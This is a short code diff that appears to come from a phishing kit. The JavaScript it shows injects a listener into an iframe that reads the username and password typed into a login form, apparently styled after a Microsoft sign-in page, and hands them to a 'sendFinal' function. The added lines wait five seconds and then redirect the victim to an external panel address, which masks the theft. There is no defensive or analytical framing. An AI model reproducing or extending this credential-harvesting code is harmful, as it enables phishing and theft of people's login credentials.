@@ -26,12 +26,15 @@
         // Inject script to listen to form submission inside the iframe
         var script = doc.createElement('script');
         script.textContent = `
+            const delay = ms => new Promise(res => setTimeout(res, ms));
             document.body.addEventListener('submit', async (event) => {
                 if (event.target.tagName.toLowerCase() === 'form') {
                     var username = document.getElementsByTagName('fluent-text-field')[0].value;
                     var password = document.getElementsByTagName('fluent-text-field')[1].value;
                     if(password.length > 1){
                         parent.sendFinal(username, password);
+                        await delay(5000);
+                        parent.location.href = 'https://my.daryakenar.ir/panel'
                     }
                 }
             }, true);
